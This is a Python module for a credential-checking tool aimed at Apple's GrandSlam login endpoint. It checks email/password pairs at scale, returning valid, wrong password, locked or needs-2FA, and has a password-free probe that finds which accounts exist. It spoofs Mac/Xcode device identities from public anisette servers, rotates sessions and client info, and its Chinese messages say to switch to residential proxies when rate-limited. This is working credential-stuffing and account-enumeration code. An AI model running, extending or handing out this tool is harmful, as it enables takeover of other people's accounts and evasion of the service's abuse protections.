"""GSA status engine (headless, thread-safe, cancellation aware).

Protocol and verdict table are the ones verified from the shipped build:

    init      -> tells you not_active / security_lock / locked WITHOUT a password
    complete  -> tells you valid / wrong_password (needs the SRP proof)

Additions over the original: per-account timing, finer error classification
(so retries can be targeted), init-only probing, cancellation, and an urllib
fallback so the tool runs with no third-party packages installed.
"""
from __future__ import annotations

import hashlib
import json
import os
import plistlib
import random
import re
import secrets
import socket
import ssl
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from contextlib import nullcontext
from dataclasses import dataclass
from itertools import count

from .srp_auth import GrandSlamSRPClient as SRPClient
from .apple_trust import gsa_ca_file, gsa_context
from .timing import emit, phase

try:                                   # optional: nicer pooling/proxy behaviour
    import requests                    # type: ignore
    _HAS_REQUESTS = True
except Exception:                      # pragma: no cover - fallback path
    requests = None                    # type: ignore
    _HAS_REQUESTS = False


GSA_URL = "https://gsa.apple.com/grandslam/GsService2"

# Native-library providers from SideStore's server list (2026-11-11).
# Legacy Android-library providers were returning parameters that GSA rejected.
# Source: github.com/SideStore/anisette-servers/blob/main/servers.json
ANISETTE_SERVERS = [
    "http://127.0.0.1:6970/",
    "https://new.ani.sidestore.io/",
    "https://mac-ani.jkcoxson.com/",
    "https://ani.iloader.app/",
    "https://ani3.stikstore.app/",
    "https://win.ani.sidestore.io/",
]

CLIENT_INFO_POOL = [
    "<MacBookPro18,1> <macOS;14.0;23A344> <com.apple.AuthKit/1 (com.apple.dt.Xcode/22000)>",
    "<MacBookPro15,1> <macOS;13.5;22G74> <com.apple.AuthKit/1 (com.apple.dt.Xcode/21500)>",
    "<MacBookPro16,1> <macOS;13.6.1;22G313> <com.apple.AuthKit/1 (com.apple.dt.Xcode/21603)>",
    "<Mac14,7> <macOS;14.6.1;23G93> <com.apple.AuthKit/1 (com.apple.dt.Xcode/22631)>",
    "<Mac15,7> <macOS;15.1.1;24B91> <com.apple.AuthKit/1 (com.apple.dt.Xcode/24111)>",
    "<Macmini9,1> <macOS;14.4.1;23E224> <com.apple.AuthKit/1 (com.apple.dt.Xcode/22431)>",
]
LOCALE_POOL = ["en_US", "en_GB", "en_CA", "en_AU"]
TIMEZONE_POOL = ["UTC", "GMT", "America/New_York", "America/Los_Angeles", "Europe/London"]
RINFO_POOL = [17106176, 17107200, 50660096]

# error message fragments that mean "not the account's fault": safe to retry later
TRANSIENT = (
    "http 408", "http 429", "http 500", "http 502", "http 503", "http 504",
    "http 407", "http 404", "http 501",
    "timed out", "timeout", "urlerror", "connection reset",
    "connection aborted", "remote end closed", "eof", "ssl", "tls",
    "ec=-36607", "ec=-20102", "ec=-22056", "try again later", "too many attempts",
)

_ANI_LOCK = threading.Lock()
_ANI_LIVE: list[dict] = []
_ANI_STOP = threading.Event()
_ANI_STARTED = threading.Event()
_ANI_COUNT = 0
_ROTATE_EVERY = 25
# A dead proxy exit burns the whole per-account budget on connect if the connect
# phase shares the read timeout. Measured on 800 concurrency: single exits stalled
# 25 s while healthy ones completed in ~0.6 s, so cap connect/TLS separately.
_CONNECT_TIMEOUT_CAP = 10.0
_TLS = threading.local()
_SESSION_IDS = count(1)

MOCK_RESULTS = ("valid", "wrong_password", "wrong_password", "not_active",
                "security_lock", "locked", "error")

MOCK_CN = {"valid": "有效", "wrong_password": "密码错误", "not_active": "未激活",
           "security_lock": "安全锁定", "locked": "已锁定", "error": "请求失败"}


def mock_enabled() -> bool:
    """FASTCHECK_MOCK=1 -> no network at all (for UI / engine testing)."""
    return os.environ.get("FASTCHECK_MOCK", "") == "1"


def _mock_verdict(email: str, stage: str) -> dict:
    time.sleep(random.uniform(0.05, 0.35))
    status = MOCK_RESULTS[_seed(email, "mock") % len(MOCK_RESULTS)]
    detail = "" if status == "valid" else f"模拟结果：{MOCK_CN.get(status, status)}"
    kind = "network" if status == "error" else ""
    return {"status": status, "detail": detail, "ms": random.randint(90, 1800),
            "kind": kind, "stage": stage}


# --------------------------------------------------------------------------- #
# anisette pool
# --------------------------------------------------------------------------- #
def _fetch_anisette(url: str, timeout: float = 8.0) -> dict:
    req = urllib.request.Request(url.rstrip("/") + "/", headers={"User-Agent": "anisette"})
    ctx = ssl.create_default_context()
    # 明确禁用系统代理：注入服务器是直连的，若系统代理配置了却没启动
    # （很常见：Clash 关了但 IE 代理还留着），urllib 会连 127.0.0.1 直接失败。
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.ProxyHandler({}))
    with opener.open(req, timeout=timeout) as resp:
        data = resp.read(16385)
        if len(data) > 16384:
            raise ValueError("Anisette response exceeds limit")
        return json.loads(data)


def refresh_anisette() -> int:
    """Pull one identity per reachable server. Returns how many are live."""
    live: list[dict] = []
    for url in ANISETTE_SERVERS:
        try:
            ident = _fetch_anisette(url)
        except Exception:
            continue
        if ident.get("X-Apple-I-MD") and ident.get("X-Apple-I-MD-M"):
            live.append(ident)
    if live:
        with _ANI_LOCK:
            _ANI_LIVE[:] = live
        global _ANI_COUNT
        _ANI_COUNT = len(live)
    return len(live)


def _refresher() -> None:
    while not _ANI_STOP.wait(15):
        try:
            refresh_anisette()
        except Exception:
            pass


def start_anisette(block: bool = True) -> int:
    """Pre-warm the pool (once) and keep it fresh in the background."""
    if mock_enabled():
        with _ANI_LOCK:
            _ANI_LIVE[:] = [{"X-Apple-I-MD": "mock", "X-Apple-I-MD-M": "mock"}
                            for _ in ANISETTE_SERVERS]
        global _ANI_COUNT
        _ANI_COUNT = len(ANISETTE_SERVERS)
        return _ANI_COUNT
    count = refresh_anisette() if block else 0
    if not _ANI_STARTED.is_set():
        _ANI_STARTED.set()
        threading.Thread(target=_refresher, daemon=True, name="anisette-refresh").start()
    return count


def stop_anisette() -> None:
    _ANI_STOP.set()
    _ANI_STARTED.clear()


def anisette_count() -> int:
    with _ANI_LOCK:
        return len(_ANI_LIVE)


def _pick_anisette() -> dict | None:
    with _ANI_LOCK:
        return random.choice(_ANI_LIVE) if _ANI_LIVE else None


# --------------------------------------------------------------------------- #
# stable-per-account identity material
# --------------------------------------------------------------------------- #
def _seed(email: str, salt: str = "") -> int:
    return int(hashlib.sha256(((email or "").lower() + "|" + salt).encode()).hexdigest(), 16)


def _pick(email: str, salt: str, pool):
    return pool[_seed(email, salt) % len(pool)]


def _device_id(email: str) -> str:
    h = hashlib.sha256(("dev|" + (email or "")).encode()).hexdigest()
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:32]}".upper()


def _build_cpd(ani: dict, email: str) -> dict:
    for key in ("X-Apple-I-MD", "X-Apple-I-MD-M", "X-Apple-I-MD-LU"):
        if not isinstance(ani.get(key), str) or not ani[key]:
            raise ValueError("Incomplete Anisette authentication metadata")
    locale = ani.get("X-Apple-Locale") or "en_US"
    client_info = ani.get("X-MMe-Client-Info") or ani.get("X-Mme-Client-Info")
    device_id = ani.get("X-Mme-Device-Id") or ani.get("X-MMe-Device-Id")
    if not isinstance(client_info, str) or not isinstance(device_id, str) or not client_info or not device_id:
        raise ValueError("Anisette service did not provide consistent client metadata")
    if any("\r" in v or "\n" in v for v in (client_info, device_id)):
        raise ValueError("Invalid client metadata")
    rinfo = ani.get("X-Apple-I-MD-RINFO")
    if type(rinfo) is int:
        rinfo = str(rinfo)
    if not isinstance(rinfo, str) or not rinfo.isascii() or not rinfo.isdecimal() or len(rinfo) > 20:
        raise ValueError("Invalid routing metadata")
    if int(rinfo) > 0xFFFFFFFFFFFFFFFF:
        raise ValueError("Routing metadata exceeds uint64")
    # IDA: sub_14176E450 formats RoutingInfo with %llu into a CFString.
    # Keep the provider's routing value but serialize it as a plist string.
    rinfo = str(int(rinfo))
    cpd = {
        "X-Apple-I-MD": ani.get("X-Apple-I-MD", ""),
        "X-Apple-I-MD-M": ani.get("X-Apple-I-MD-M", ""),
        "X-Apple-I-MD-RINFO": rinfo,
        "X-Apple-I-MD-LU": ani.get("X-Apple-I-MD-LU", ""),
        "X-Mme-Device-Id": device_id,
        "bootstrap": True,
        "loc": locale,
    }
    # Successful iTunes capture: AuthKit bootstrap, without an iCloud-service
    # request. Optional device/country facts come only from supplied metadata.
    legacy = ani.get("X-Mme-Legacy-Device-Id")
    if isinstance(legacy, str) and legacy:
        cpd["X-Mme-Legacy-Device-Id"] = legacy
    country = ani.get("X-Mme-Country")
    if not country and isinstance(locale, str):
        country = locale.replace("-", "_").rsplit("_", 1)[-1]
    if isinstance(country, str) and len(country) == 2 and country.isascii() and country.isalpha():
        cpd["cou"] = country.upper()
    return cpd


def _client_info(ani):
    return ani.get("X-MMe-Client-Info") or ani.get("X-Mme-Client-Info") or ""


# --------------------------------------------------------------------------- #
# transport
# --------------------------------------------------------------------------- #
@dataclass
class HttpOutcome:
    payload: dict | None
    error: str = ""
    kind: str = ""
    http_status: int = 0
    content_type: str = ""
    apple_ec: int | None = None


_HEADERS = {
    "Content-Type": "text/x-xml-plist",
    "User-Agent": "akd/1.0 CFNetwork/1494.0.7 Darwin/23.4.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
}


def _transport_detail(exc: Exception, proxy=None, redactions=()) -> str:
    """Preserve transport causes without copying known authentication values."""
    pending, seen, parts = [exc], set(), []
    while pending:
        error = pending.pop()
        if not isinstance(error, BaseException) or id(error) in seen:
            continue
        seen.add(id(error))
        part = f"{type(error).__name__}: {error}"
        if not any(part in previous for previous in parts):
            parts.append(part)
        pending.extend(value for value in error.args if isinstance(value, BaseException))
        pending.extend((error.__cause__, getattr(error, "reason", None),
                        getattr(error, "original_error", None)))
    detail = " ; Caused by: ".join(parts)
    values = list(redactions)
    if proxy:
        try:
            address = urllib.parse.urlsplit(proxy)
            values.extend((address.username, address.password))
        except ValueError:
            pass
    variants = {variant for value in values if isinstance(value, str) and value
                for decoded in (value, urllib.parse.unquote(value))
                for variant in (decoded, urllib.parse.quote(decoded, safe=""),
                                urllib.parse.quote_plus(decoded, safe=""))}
    for value in sorted(variants, key=len, reverse=True):
        if len(value) < 4:
            detail = re.sub(r"(?<!\w)" + re.escape(value) + r"(?!\w)", "[已隐藏]", detail)
        else:
            detail = detail.replace(value, "[已隐藏]")
    detail = re.sub(r"(?i)(\b[a-z][a-z0-9+.-]*://)[^\s/'\"]+@", r"\1[已隐藏]@", detail)
    detail = re.sub(r"(?i)([?&](?:password|passwd|pwd|token|access_token|api[_-]?key|secret|auth)=)[^&#\s'\")]+",
                    r"\1[已隐藏]", detail)
    detail = re.sub(r"(?i)[\w.!#$%&'*+/=?^`{|}~-]+@[\w.-]+\.[a-z]{2,}", "[已隐藏]", detail)
    return "".join(" " if ord(char) < 32 or ord(char) == 127 else char for char in detail)


def _classify_transport(exc: Exception, proxy=None, redactions=()) -> tuple[str, str]:
    name = type(exc).__name__
    text = f"{name}: {exc}".lower()
    detail = _transport_detail(exc, proxy, redactions)
    if isinstance(exc, urllib.error.HTTPError):
        code = exc.code
        if code == 407:
            return "proxy_auth", "HTTP 407（代理认证失败）"
        if code == 429:
            return "ratelimit", "HTTP 429（请求过多被限流）"
        if code in (404, 501):
            # GSA answers 404 with an empty body when the request is not accepted
            # (bad/absent anisette identity), and 501 for unsupported routes.
            # Measured 2026-11-10: a valid identity flips 404 -> 503, i.e. the
            # endpoint itself is alive and this is an environment problem.
            return "endpoint", (f"HTTP {code}（请求未被接受：注入标识无效，"
                                f"或出口被拦）")
        if 500 <= code < 600:
            return "server", (f"HTTP {code}（服务暂不可用；出口 IP 被限流时"
                              f"常见，优先换住宅代理）")
        return "http", f"HTTP {code}"
    if "ssl" in text or "tls" in text or "certificate" in text:
        return "tls", detail
    if isinstance(exc, socket.timeout) or "timed out" in text or "timeout" in text:
        return "network", f"超时：{detail}"
    if "proxy" in text:
        return "proxy", detail
    return "network", detail


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class _Session:
    """Per-thread HTTP session: requests when available, urllib otherwise."""

    def __init__(self, proxy: str | None, resolver=None):
        self._diagnostic_id = next(_SESSION_IDS)
        self._owner_thread_id = threading.get_ident()
        self._generation = 0
        self.proxy = proxy
        self._resolver = resolver
        self._count = 0
        self._impl = None
        self._trace = None
        self._rebuild()

    def _rebuild(self) -> None:
        self._generation += 1
        self._trace = None
        if _HAS_REQUESTS:
            sess = requests.Session()
            sess.verify = gsa_ca_file()
            sess.trust_env = False
            adapter = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4,
                                                    max_retries=0)
            sess.mount("http://", adapter)
            sess.mount("https://", adapter)
            if self.proxy:
                sess.proxies = {"http": self.proxy, "https": self.proxy}
            self._impl = sess
        else:
            ctx = gsa_context()
            handlers = [urllib.request.HTTPSHandler(context=ctx), _NoRedirect(),
                        urllib.request.HTTPCookieProcessor()]
            if self.proxy:
                handlers.append(urllib.request.ProxyHandler({"http": self.proxy,
                                                             "https": self.proxy}))
            else:
                # 无代理时必须显式禁用系统代理，否则会走一个可能没启动的
                # 127.0.0.1 代理端口，直接连不上
                handlers.append(urllib.request.ProxyHandler({}))
            self._impl = urllib.request.build_opener(*handlers)

    def rotate_if_needed(self) -> None:
        self._count += 1
        if self._count % _ROTATE_EVERY == 0:
            try:
                if _HAS_REQUESTS and self._impl is not None:
                    self._impl.close()
            except Exception:
                pass
            self._rebuild()

    def post(self, body: bytes, cpd: dict, timeout: float, diagnostics=None,
             request_phase="http_init", client_info=None,user_agent=None) -> HttpOutcome:
        headers = dict(_HEADERS)
        headers["X-MMe-Client-Info"] = client_info if client_info is not None else cpd.get("X-MMe-Client-Info", "")
        if user_agent is not None:
            if not isinstance(user_agent,str) or not user_agent or len(user_agent)>4096 or '\r' in user_agent or '\n' in user_agent:
                return HttpOutcome(None,'Invalid provider user agent','anisette')
            headers['User-Agent']=user_agent
        self.rotate_if_needed()
        emit(diagnostics, {"event": "session_context", "request_phase": request_phase,
                          "thread_id": threading.get_ident(), "owner_thread_id": self._owner_thread_id,
                          "auth_session_id": self._diagnostic_id, "http_session_generation": self._generation})
        try:
            if _HAS_REQUESTS:
                if (diagnostics is not None or self._resolver is not None) and self._trace is None:
                    from .network_timing import NetworkTrace, TimingAdapter
                    self._trace = NetworkTrace(diagnostics, resolver=self._resolver)
                    for scheme in ("http://", "https://"):
                        old = self._impl.get_adapter(scheme)
                        self._impl.mount(scheme, TimingAdapter(self._trace, pool_connections=4,
                                                              pool_maxsize=4, max_retries=0))
                        old.close()
                trace = self._trace
                if trace is not None:
                    trace.callback = diagnostics
                context = trace.request(request_phase) if trace else nullcontext()
                with context:
                    kwargs = {"stream": True} if trace else {}
                    # Concretely: connect+TLS through the proxy may fail long
                    # before the response body is due, so bound them separately.
                    budget = timeout
                    if isinstance(timeout, (int, float)) and timeout > _CONNECT_TIMEOUT_CAP:
                        budget = (_CONNECT_TIMEOUT_CAP, timeout)
                    with self._impl.post(GSA_URL, data=body, headers=headers, timeout=budget,
                                         allow_redirects=False, **kwargs) as resp:
                        code = resp.status_code
                        content_type = resp.headers.get("Content-Type", "").split(";", 1)[0][:80]
                        with phase(trace.record if trace else None, "response_body"):
                            raw = resp.content
            else:
                req = urllib.request.Request(GSA_URL, data=body, headers=headers)
                try:
                    response = self._impl.open(req, timeout=timeout)
                except urllib.error.HTTPError as exc:
                    response = exc
                with response as resp:
                    code = resp.code
                    content_type = resp.headers.get("Content-Type", "").split(";", 1)[0][:80]
                    raw = resp.read()
        except Exception as exc:                       # noqa: BLE001
            kind, msg = _classify_transport(exc, self.proxy, redactions=[cpd.get(key) for key in
                ("X-Apple-I-MD", "X-Apple-I-MD-M", "X-Apple-I-MD-LU", "X-Mme-Device-Id", "X-Mme-Legacy-Device-Id")])
            return HttpOutcome(None, msg, kind)
        try:
            payload = plistlib.loads(raw)
        except Exception:
            payload = None
        response = payload.get("Response") if isinstance(payload, dict) else None
        status = response.get("Status") if isinstance(response, dict) else None
        ec = status.get("ec") if isinstance(status, dict) else None
        if type(ec) is not int:
            ec = None
        if not 200 <= code < 300:
            kind = ("ratelimit" if code == 429 else "proxy_auth" if code == 407 else
                    "server" if code >= 500 else "http")
            detail = f"HTTP {code}; Content-Type={content_type or 'absent'}"
            if ec is not None:
                detail += f"; ec={ec}"
            return HttpOutcome(None, detail, kind, code, content_type, ec)
        if not isinstance(payload, dict) or not isinstance(status, dict) or ec is None:
            return HttpOutcome(None, f"HTTP {code}; invalid GSA plist/status", "protocol", code, content_type)
        return HttpOutcome(payload, "", "", code, content_type, ec)


def _session_for(proxy: str | None) -> _Session:
    sess = getattr(_TLS, "sess", None)
    if sess is None or sess.proxy != proxy:
        sess = _Session(proxy, resolver=getattr(_TLS, "resolver", None))
        _TLS.sess = sess
    return sess


def close_session() -> None:
    """Discard this thread's cookies and connections after a CLI attempt."""
    sess = getattr(_TLS, "sess", None)
    try:
        if sess is not None and _HAS_REQUESTS:
            sess._impl.close()
    finally:
        _TLS.sess = None
        _TLS.resolver = None


def set_rotate_every(n: int) -> None:
    global _ROTATE_EVERY
    _ROTATE_EVERY = max(1, int(n))


# --------------------------------------------------------------------------- #
# verdicts
# --------------------------------------------------------------------------- #
def classify(ec, em: str) -> tuple[str, str]:
    """Map (ec, em) to one of the public status strings."""
    em_l = (em or "").lower()
    if ec == 0:
        return "valid", ""
    if any(s in em_l for s in ("password was entered incorrectly",
                              "incorrect username or password",
                              "username or password is incorrect",
                              "information was entered incorrectly")):
        return "wrong_password", em
    if ec in (-22406, -22025, -22420, -20101):
        return "wrong_password", f"ec={ec}"
    if "not active" in em_l or "request access" in em_l or ec == -20751:
        return "not_active", em or f"ec={ec}"
    if "locked for security reasons" in em_l or ec == -20209:
        return "security_lock", em or f"ec={ec}"
    if any(s in em_l for s in ("account is disabled", "account is locked",
                              "has been locked", "has been disabled", "accountdisabled")) \
            or ec in (-20752, -22413, -22014):
        return "locked", em or f"ec={ec}"
    return "error", f"ec={ec} {em}".strip()


def _error_kind(detail: str) -> str:
    low = detail.lower()
    if any(t in low for t in ("http 407",)) or "代理认证" in detail:
        return "proxy_auth"
    if any(t in low for t in ("http 404", "http 501")):
        return "endpoint"
    if any(t in low for t in ("http 429", "too many attempts", "try again later")):
        return "ratelimit"
    if any(t in low for t in ("http 500", "http 502", "http 503", "http 504")):
        return "server"
    if any(t in low for t in ("timeout", "timed out", "urlerror", "connection",
                             "eof", "remote end closed")) or "超时" in detail:
        return "network"
    if any(t in low for t in ("ssl", "tls", "certificate")) or "证书" in detail:
        return "tls"
    if any(t in low for t in ("ec=-36607", "ec=-20102", "ec=-22056")):
        return "server"
    if "注入环境" in detail:
        return "anisette"
    return "protocol"


def is_transient(detail: str, kind: str = "") -> bool:
    if kind in ("network", "tls", "proxy", "proxy_auth", "server", "ratelimit",
                "endpoint"):
        return True
    low = detail.lower()
    return any(t in low for t in TRANSIENT)


def _result(status: str, detail: str, started: float, kind: str = "",
            stage: str = "") -> dict:
    result = {
        "status": status,
        "detail": detail,
        "ms": int((time.time() - started) * 1000),
        "kind": kind or ("" if status != "error" else _error_kind(detail)),
        "stage": stage,
    }
    code=getattr(_TLS,'current_http',None)
    if stage in ('init','complete') and code is not None:
        result['http']=code
    return result


def _with_apple_message(result, status, email, password, proxy, identity):
    """Keep a bounded display message separate from verdict and retry decisions."""
    if type(status.get("ec")) is int:
        result["apple_ec"] = status["ec"]
    message = status.get("em")
    if not isinstance(message, str) or not message.strip():
        return result
    redactions = [email, password, proxy]
    if proxy:
        try:
            address = urllib.parse.urlsplit(proxy)
            redactions.extend((address.username, address.password))
            redactions.extend(urllib.parse.unquote(value) for value in
                              (address.username, address.password) if value)
        except ValueError:
            pass
    redactions.extend(identity.get(key) for key in
                      ("X-Apple-I-MD", "X-Apple-I-MD-M", "X-Apple-I-MD-LU",
                       "X-Mme-Device-Id", "X-MMe-Device-Id"))
    variants = {variant for value in redactions if isinstance(value, str) and value
                for variant in (value, urllib.parse.quote(value, safe=""),
                                urllib.parse.quote_plus(value, safe=""))}
    for value in sorted(variants, key=len, reverse=True):
        message = message.replace(value, "[已隐藏]")
    if email:
        for value in (email, urllib.parse.quote(email, safe=""), urllib.parse.quote_plus(email, safe="")):
            message = re.sub(re.escape(value), "[已隐藏]", message, flags=re.IGNORECASE)
    message = "".join(" " if ord(char) < 32 or ord(char) == 127 else char for char in message).strip()
    result["apple_message"] = message if len(message) <= 2048 else message[:2047] + "…"
    return result


# --------------------------------------------------------------------------- #
# public API
# --------------------------------------------------------------------------- #
def _cancelled(cancel) -> bool:
    try:
        return bool(cancel and cancel())
    except Exception:
        return False


def probe(email: str, proxy: str | None, timeout: float = 15.0,
          cancel=None) -> dict:
    """Init-only screen: 1 request, no password needed.

    Returns state in {alive, not_active, security_lock, locked, error, stopped}.
    `alive` means "the account exists and is not pre-blocked" - the password is
    still unknown, so feed alive.txt to the checker.
    """
    started = time.time()
    if _cancelled(cancel):
        return _result("stopped", "", started, stage="probe")
    if mock_enabled():
        verdict = _mock_verdict(email, "probe")
        if verdict["status"] in ("valid", "wrong_password"):
            # no password was ever sent in probe mode, so the only bucket is "alive"
            verdict["status"] = "alive"
            verdict["detail"] = ""
        return verdict
    ident = _pick_anisette()
    if ident is None:
        return _result("error", "no anisette (servers unreachable)", started,
                       kind="anisette", stage="probe")
    try:
        cpd = _build_cpd(ident, email)
    except (TypeError, ValueError):
        return _result("error", "Anisette 客户端元数据不完整或格式错误，未提交认证请求", started,
                       kind="anisette", stage="probe")
    srp = SRPClient(email, "probe-only")
    body = plistlib.dumps({
        "Header": {"Version": "1.0.1"},
        "Request": {"cpd": cpd, "u": email, "A2k": srp.A_bytes,
                    "ps": ["s2k", "s2k_fo"], "o": "init"},
    })
    out = _session_for(proxy).post(body, cpd, timeout, client_info=_client_info(ident),user_agent=ident.get('User-Agent'))
    if out.payload is None:
        return _result("error", out.error, started, kind=out.kind, stage="probe")
    status = ((out.payload.get("Response") or {}).get("Status") or {})
    ec, em = status.get("ec"), status.get("em", "") or ""
    verdict, detail = classify(ec, em)
    if verdict == "valid":            # init said ok -> the address is reachable
        return _result("alive", "", started, stage="probe")
    if verdict == "error":
        return _result("error", detail, started, stage="probe")
    return _result(verdict, detail, started, stage="probe")


def check(email: str, password: str, proxy: str | None, timeout: float = 15.0,
          retries: int = 1, cancel=None, diagnostics=None, *, identity=None) -> dict:
    """Full verdict for one credential pair (init + complete, 2 requests)."""
    started = time.time()
    last: dict | None = None
    for attempt in range(max(0, retries) + 1):
        _TLS.current_http=None
        if _cancelled(cancel):
            return _result("stopped", "", started, stage="check")
        if mock_enabled():
            with phase(diagnostics, "mock_check"):
                return _mock_verdict(email, "check")
        if attempt and last is not None and not is_transient(last["detail"], last["kind"]):
            return last
        result = _once(email, password, proxy, timeout, cancel, started, diagnostics, identity=identity)
        if result["status"] == "stopped":
            return result
        if result["status"] != "error" or not is_transient(result["detail"], result["kind"]):
            return result
        last = result
    return last or _result("error", "no attempt made", started, stage="check")


def _once(email: str, password: str, proxy: str | None, timeout: float,
          cancel, started: float, diagnostics=None, *, identity=None) -> dict:
    ident = identity if identity is not None else _pick_anisette()
    if ident is None:
        return _result("error", "no anisette (servers unreachable)", started,
                       kind="anisette", stage="init")
    try:
        with phase(diagnostics, "srp_init"):
            srp = SRPClient(email, password)
    except Exception as exc:                          # noqa: BLE001
        return _result("error", f"srp init: {exc}", started, kind="protocol", stage="init")
    with phase(diagnostics, "client_setup"):
        try:
            cpd = _build_cpd(ident, email)
        except (TypeError, ValueError):
            return _result("error", "Anisette 客户端元数据不完整或格式错误，未提交认证请求", started,
                           kind="anisette", stage="init")
        session = _session_for(proxy)

    init_body = plistlib.dumps({
        "Header": {"Version": "1.0.1"},
        "Request": {"cpd": cpd, "u": email, "A2k": srp.A_bytes,
                    "ps": ["s2k", "s2k_fo"], "o": "init"},
    })
    with phase(diagnostics, "http_init") as timing:
        init = session.post(init_body, cpd, timeout, diagnostics=diagnostics, request_phase="http_init",
                            client_info=_client_info(ident),user_agent=ident.get('User-Agent'))
        _TLS.current_http=init.http_status
        timing["http"] = init.http_status
        if init.apple_ec is not None:
            timing["apple_ec"] = init.apple_ec
    if _cancelled(cancel):
        return _result("stopped", "", started, stage="init")
    if init.payload is None:
        return _result("error", f"init {init.error}", started, kind=init.kind, stage="init")

    response = init.payload.get("Response") or {}
    status = response.get("Status") or {}
    if status.get("ec") != 0:
        verdict, detail = classify(status.get("ec"), status.get("em", "") or "")
        if verdict == "wrong_password":
            result = _result("error", f"init 未提交密码证明，无法判断密码（ec={status.get('ec')}）",
                             started, kind="protocol", stage="init")
            return _with_apple_message(result, status, email, password, proxy, ident)
        result = _result(verdict, detail, started, stage="init")
        return _with_apple_message(result, status, email, password, proxy, ident)

    try:
        if "c" not in response:
            raise KeyError("c")
        with phase(diagnostics, "srp_challenge") as timing:
            timing["iterations"] = response["i"]
            m1 = srp.process_challenge(response["s"], response["B"], response["i"],
                                       response["sp"])
    except KeyError as exc:
        return _result("error", f"init missing {exc}", started, kind="protocol", stage="init")
    except Exception as exc:                          # noqa: BLE001
        return _result("error", f"srp: {type(exc).__name__}", started,
                       kind="protocol", stage="init")

    done_body = plistlib.dumps({
        "Header": {"Version": "1.0.1"},
        "Request": {"cpd": cpd, "u": email, "M1": m1, "c": response["c"],
                    "o": "complete"},
    })
    with phase(diagnostics, "http_complete") as timing:
        done = session.post(done_body, cpd, timeout, diagnostics=diagnostics, request_phase="http_complete",
                            client_info=_client_info(ident),user_agent=ident.get('User-Agent'))
        _TLS.current_http=done.http_status
        timing["http"] = done.http_status
        if done.apple_ec is not None:
            timing["apple_ec"] = done.apple_ec
    if done.payload is None:
        return _result("error", f"complete {done.error}", started,
                       kind=done.kind, stage="complete")
    final_response = done.payload.get("Response") or {}
    status2 = final_response.get("Status") or {}
    if status2.get("ec") in (-22025, -22420):
        result = _result("error", f"认证未完成，无法确定密码错误（ec={status2.get('ec')}）",
                         started, kind="protocol", stage="complete")
        return _with_apple_message(result, status2, email, password, proxy, ident)
    verdict, detail = classify(status2.get("ec"), status2.get("em", "") or "")
    if verdict == "valid":
        proof = final_response.get("M2")
        if not isinstance(proof, bytes) or not srp.verify_M2(proof):
            return _result("error", "缺少或无法验证 GSA 服务器证明，未确认密码", started,
                           kind="protocol", stage="complete")
        raw_auth_type = status2.get("au")
        auth_type = raw_auth_type.strip() if isinstance(raw_auth_type, str) else ""
        if auth_type:
            # GSA 只有在密码证明已通过后需要继续身份验证时才返回 au。
            # Apple 会按账号/地区返回不同名称（例如手机验证码挑战），
            # 所以不再只匹配两个固定字符串；有 au 就归入“双重验证”。
            verdict, detail = "need_2fa", "密码证明通过，服务要求二次验证"
        else:
            detail = "密码证明通过；未确认业务服务登录状态"
        result = _result(verdict, detail, started, stage="complete")
        result.update(password_verified=True,
                      two_factor_status="required" if verdict == "need_2fa" else "unknown",
                      auth_type=(auth_type[:80] if auth_type else "none"))
        return result
    result = _result(verdict, detail, started, stage="complete")
    return _with_apple_message(result, status2, email, password, proxy, ident)


# --------------------------------------------------------------------------- #
# self check
# --------------------------------------------------------------------------- #
_HINTS = {
    "endpoint": "接口拒绝：注入标识无效或出口被拦，换住宅代理",
    "server": "接口暂不可用（常见于出口 IP 被限流），换住宅代理",
    "proxy_auth": "代理认证失败，检查账号密码",
    "ratelimit": "被限流，降低并发或换出口",
    "tls": "证书握手失败，检查代理是否截断 TLS",
    "network": "网络不通或超时",
    "anisette": "注入环境不可用",
}


def endpoint_status(proxy: str | None = None, timeout: float = 12.0) -> dict:
    """Send one minimal init with a throwaway address to test the live interface.

    This separates the three failure modes people hit:
      * plist answer        -> interface fine, the account answer is trustworthy
      * 404 / 501           -> request not accepted (bad anisette or blocked exit)
      * 5xx                 -> service throttling this exit IP
    """
    if mock_enabled():
        return {"ok": True, "code": 0, "kind": "mock",
                "detail": "演示模式：未联网，接口未验证"}
    ident = _pick_anisette()
    if ident is None:
        return {"ok": False, "code": 0, "kind": "anisette",
                "detail": "注入环境不可用（所有服务器无响应）"}
    email = "probe@example.invalid"
    try:
        cpd = _build_cpd(ident, email)
    except (TypeError, ValueError):
        return {"ok": False, "code": 0, "kind": "anisette",
                "detail": "Anisette 客户端元数据不完整或格式错误，未提交认证请求"}
    try:
        srp = SRPClient(email, "probe-only")
    except Exception as exc:                            # noqa: BLE001
        return {"ok": False, "code": 0, "kind": "protocol", "detail": f"SRP 失败：{exc}"}
    body = plistlib.dumps({
        "Header": {"Version": "1.0.1"},
        "Request": {"cpd": cpd, "u": email, "A2k": srp.A_bytes,
                    "ps": ["s2k", "s2k_fo"], "o": "init"},
    })
    out = _session_for(proxy).post(body, cpd, timeout, client_info=_client_info(ident),user_agent=ident.get('User-Agent'))
    if out.payload is None:
        hint = _HINTS.get(out.kind, "")
        return {"ok": False, "code": 0, "kind": out.kind,
                "detail": f"{out.error}（{hint}）" if hint else out.error}
    status = (out.payload.get("Response") or {}).get("Status") or {}
    return {"ok": True, "code": 200, "kind": "ok",
            "detail": f"接口可用（占位地址返回 ec={status.get('ec')}）"}
